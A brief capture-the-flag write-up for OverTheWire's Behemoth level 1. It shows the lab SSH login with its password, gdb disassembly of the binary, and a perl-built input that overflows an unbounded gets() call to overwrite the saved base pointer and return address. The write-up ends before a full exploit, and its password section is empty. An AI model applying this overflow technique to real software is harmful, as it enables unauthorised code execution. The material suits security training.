# Level 1 → Level 2

## Solution
```
ssh behemoth1@behemoth.labs.overthewire.org -p 2221
```
```
8JHFW9vGru
```
```
cd /behemoth ; ls -al
```
```
./behemoth1
```
```
13337
```

![](0.png)

strace and ltrace gave no information, and string search yielded nothing either.<br />
Therefore, we will look for existing functions and enter gdb:

```
nm ./behemoth1 | grep " T "
```

![](1.png)

```
gdb ./behemoth1
```
```
set disassembly-flavor intel
```
```
disas main
```

![](2.png)

* `0x44` bytes on the stack
* `0x43` bytes for user input (until $bp)
* there is no limit with `gets`, so we can overrite the return-address.

Let's check this:

```
r <<< $(perl -e 'print "A"x(0x43), "BBBB", "CCCC"')
```

![](3.png)

* `BBBB` - overrite the address of old $bp
* `CCCC` - overrite the address of the return value.



## Password for the next level:
```

```
